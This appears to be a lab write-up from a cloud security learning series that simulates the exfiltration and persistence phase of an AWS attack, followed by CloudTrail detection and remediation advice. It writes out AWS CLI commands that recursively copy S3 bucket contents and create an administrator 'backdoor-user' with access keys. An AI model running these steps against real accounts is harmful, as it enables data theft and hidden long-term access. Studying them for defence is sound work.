# Day 10 – Data Exfiltration and Persistence in AWS

## Objective
Simulate how an attacker, after gaining administrative access, can extract sensitive data from AWS and establish persistence to maintain long-term access.

---

## Concepts Learned

### Data Exfiltration
Data exfiltration refers to the unauthorized transfer of sensitive data from a cloud environment to an external location controlled by an attacker.

---

### Persistence
Persistence is the technique used by attackers to maintain access even after initial credentials are revoked or detected.

---

### Why This Stage is Critical

After privilege escalation, attackers typically:

- Extract valuable data (S3, databases, logs)
- Create backdoor access mechanisms
- Ensure continued access to the environment

---

### Real-World Scenario

In real cloud breaches:

- Attackers escalate privileges
- Exfiltrate sensitive data from storage services
- Create hidden IAM users or roles
- Maintain access even after incident response begins

---

## Practical Work

### 1. Identified Target Resources

Using elevated privileges, enumerated available resources:

```bash
aws s3 ls
aws ec2 describe-instances
aws iam list-users
```

Focused on S3 buckets as primary data targets.

---

### 2. Data Exfiltration from S3

Listed bucket contents:

```bash
aws s3 ls s3://<bucket-name>
```

Downloaded sensitive data:

```bash
aws s3 cp s3://<bucket-name>/ ./exfiltrated-data/ --recursive
```

This simulates unauthorized data extraction.

---

### 3. Simulated External Exfiltration

Copied downloaded data to a local system (attacker machine), representing data being moved outside AWS.

---

### 4. Persistence via IAM Backdoor User

Created a new IAM user:

```bash
aws iam create-user --user-name backdoor-user
```

Attached admin privileges:

```bash
aws iam attach-user-policy \
--user-name backdoor-user \
--policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

---

### 5. Created Access Keys for Persistence

```bash
aws iam create-access-key --user-name backdoor-user
```

Stored credentials for long-term access.

---

### 6. Alternative Persistence (Backdoor Role)

Created a role with permissive trust policy allowing future access.

This provides stealthier persistence compared to IAM users.

---

### 7. Validation of Persistence

Logged in using newly created credentials and verified access:

```bash
aws sts get-caller-identity
aws iam list-users
```

Confirmed continued administrative control.

---

## Identity Observation

Observed that:

- New IAM user operates independently of original compromised account  
- Actions appear as a legitimate new user in logs  
- Persistence mechanism is not tied to initial attack vector  

---

## Security Observation

Once administrative access is obtained, attackers can:

- Exfiltrate large volumes of sensitive data  
- Create multiple persistence mechanisms  
- Maintain access even after detection  

Without proper monitoring, these actions may go unnoticed.

---

## Detection

Using AWS CloudTrail, monitored events such as:

- `CreateUser`  
- `CreateAccessKey`  
- `AttachUserPolicy`  
- `GetObject` (S3 data access)  

Unusual spikes in S3 access or IAM changes indicate suspicious activity.

---

## Remediation

To prevent data exfiltration and persistence:

- Apply least privilege access controls  
- Enable S3 bucket logging and monitoring  
- Use AWS GuardDuty for threat detection  
- Rotate and revoke compromised credentials immediately  
- Monitor IAM changes continuously  
- Enforce MFA for all users  
- Regularly audit IAM users and roles  

---

## Tools Used

- AWS Management Console  
- IAM (Identity and Access Management)  
- S3 (Simple Storage Service)  
- AWS CLI  
- CloudTrail  
- Git  
- GitHub  
- Markdown documentation  

---

## Impact

Successful exploitation at this stage can lead to:

- Sensitive data leaks  
- Long-term unauthorized access  
- Full infrastructure compromise  
- Financial and reputational damage  

---

## Conclusion

This stage demonstrates the final phase of a cloud attack lifecycle:

1. Initial Access (Credentials)  
2. Role Misuse  
3. Privilege Escalation  
4. Data Exfiltration & Persistence  

Understanding this chain is critical for both attackers (offensive security) and defenders (cloud security).

---

## Next Steps

Future improvements to this lab may include:

- Detection engineering with CloudWatch and alerts  
- Automated attack simulation scripts  
- Integration with security tools like SIEM  
- Advanced stealth techniques used by attackers  